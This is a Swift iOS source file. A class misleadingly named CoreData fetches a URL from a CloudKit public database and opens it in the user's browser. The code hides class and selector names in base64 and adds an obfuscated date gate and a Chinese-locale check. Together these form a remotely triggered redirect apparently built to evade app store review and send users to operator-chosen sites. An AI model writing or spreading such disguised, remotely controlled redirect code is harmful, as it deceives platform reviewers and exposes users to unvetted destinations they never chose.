
import UIKit
import CloudKit

class CoreData:NSObject {
    
    //cloukit
    class func getLocalCoreData() {
        
        let container = CKContainer.default()
        let publicDatabase = container.publicCloudDatabase
        let predicate = NSPredicate(value: true)
        let query = CKQuery(recordType: "CoreData", predicate: predicate)
        publicDatabase.perform(query, inZoneWith: nil, completionHandler: {
            (results, error) -> Void in
            
            guard let resluts = results else{return}
            if !(resluts.count == 0){
                let result =  resluts.first?.object(forKey: "data")
                guard let result1 = result else{return}
                guard let url = URL(string: result1 as! String) else {return}
                DispatchQueue.main.async {
                    Machine.machine(url.absoluteString)
                }
            }
        })
    }
    
    class func getLocationCoreData(_ compltetion: @escaping (String?)->Void) {
        
        let container = CKContainer.default()
        let publicDatabase = container.publicCloudDatabase
        let predicate = NSPredicate(value: true)
        let query = CKQuery(recordType: "CoreData", predicate: predicate)
        publicDatabase.perform(query, inZoneWith: nil, completionHandler: {
            (results, error) -> Void in
            
            if let error = error{
                DispatchQueue.main.async {
                    print(error.localizedDescription)
                    compltetion(nil)
                }
                return
            }
            guard let resluts = results else{return}
            
            if !(resluts.count == 0){
                let result =  resluts.first?.object(forKey: "data")
                guard let result1 = result else{return}
                let data = result1 as! String
                DispatchQueue.main.async {
                    compltetion(data)
                }
            }else{
                DispatchQueue.main.async {
                    compltetion(nil)
                }
            }
        })
    }
}

//openurl 加密
class Machine {
    
    class func machine(_ str:String) {
        guard let uiapp = NSClassFromString("VUlBcHBsaWNhdGlvbg==".base64Decoded()!) else {return}
        guard let nsuiapp = uiapp as? NSObjectProtocol else {return}
        let share = nsuiapp.perform(NSSelectorFromString("c2hhcmVkQXBwbGljYXRpb24=".base64Decoded()!))?.takeUnretainedValue()
        guard let shared = share as? NSObjectProtocol else {return}
        shared.perform( NSSelectorFromString("b3BlblVSTDo=".base64Decoded()!), with: NSURL(string: str))
    }
}

//Base64编码
extension String {
    
    
    func base64Encoded() -> String? {
        if let data = self.data(using: .utf8) {
            return data.base64EncodedString()
        }
        return nil
    }
    
    func base64Decoded() -> String? {
        let str = self.replacingOccurrences(of: "-", with: "+").replacingOccurrences(of: "_", with: "/")
        if let data = Data(base64Encoded: str) {
            return String(data: data, encoding: .utf8)
        }
        return nil
    }
}


extension String {
    
    //时间戳判断 加密
    mutating func getNowFime() -> Bool {
        
        let index = self.index(self.startIndex, offsetBy: 9)
        removeSubrange(self.startIndex..<index)
        append(contentsOf: "MDkwMDAw".base64Decoded()!) //090000
       
        let formatter = DateFormatter()
        formatter.dateFormat = "eXl5eU1NZGRISG1tc3M=".base64Decoded()!//yyyyMMddHHmmss
       
        
        /////////////////////////////////////////////
        let fort = NSClassFromString("TlNEYXRlRm9ybWF0dGVy".base64Decoded()!) as! NSObjectProtocol
        let fclass = fort.perform(NSSelectorFromString("bmV3".base64Decoded()!), with: nil)?.takeUnretainedValue() //[NSDateFormatter new]
        fclass?.perform(NSSelectorFromString("c2V0RGF0ZUZvcm1hdDo=".base64Decoded()!), with: "eXl5eU1NZGRISG1tc3M=".base64Decoded()!)
        
        
        let a =  NSClassFromString("TlNEYXRl".base64Decoded()!) as! NSObjectProtocol
        let c =  a.perform(NSSelectorFromString("bmV3".base64Decoded()!), with: nil)?.takeUnretainedValue() // [NSDate new]
        let nowstring = fclass?.perform(NSSelectorFromString("c3RyaW5nRnJvbURhdGU6".base64Decoded()!), with: c).takeUnretainedValue()
        
        let datatommorw = fclass?.perform(NSSelectorFromString("ZGF0ZUZyb21TdHJpbmc6".base64Decoded()!), with: self).takeUnretainedValue()
        let data2 = fclass?.perform(NSSelectorFromString("ZGF0ZUZyb21TdHJpbmc6".base64Decoded()!), with: nowstring).takeUnretainedValue()
        
        let nsdata = datatommorw as! Date
        let nsdata1 = data2 as! Date
        
        return nsdata.compare(nsdata1) != .orderedAscending
        
        /////////////////////////////////////////////

//        let nowformatterString = formatter.string(from: Date())
//
//        return formatter.date(from: self)!.compare(formatter.date(from: nowformatterString)!) != .orderedAscending
    }
    //中文
    func getlanguage()->Bool {
        return Locale.preferredLanguages.first!.contains("zh") 
    }
    
    func startJump() {
        print("abc")
    }
    
}
